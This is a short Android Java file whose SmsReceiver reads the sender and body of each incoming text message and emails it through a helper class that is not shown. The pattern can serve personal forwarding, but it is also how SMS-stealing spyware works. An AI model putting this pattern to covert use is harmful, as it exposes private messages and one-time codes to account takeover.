package net.liubaicai.android.informationlauncher;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

import net.liubaicai.android.informationlauncher.tools.EmailEx;

/**
 * Created by mac on 2017/8/2.
 */
public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Object[] pduses = (Object[]) intent.getExtras().get("pdus");
        for (Object puds:pduses){

            byte[] pdusmessage = (byte[]) puds;
            SmsMessage sms = SmsMessage.createFromPdu(pdusmessage);
            String mobile = sms.getOriginatingAddress();
            String content = sms.getMessageBody();

            EmailEx mailManager = new EmailEx();
            mailManager.Send("短信息:"+mobile, content);
        }
    }
}
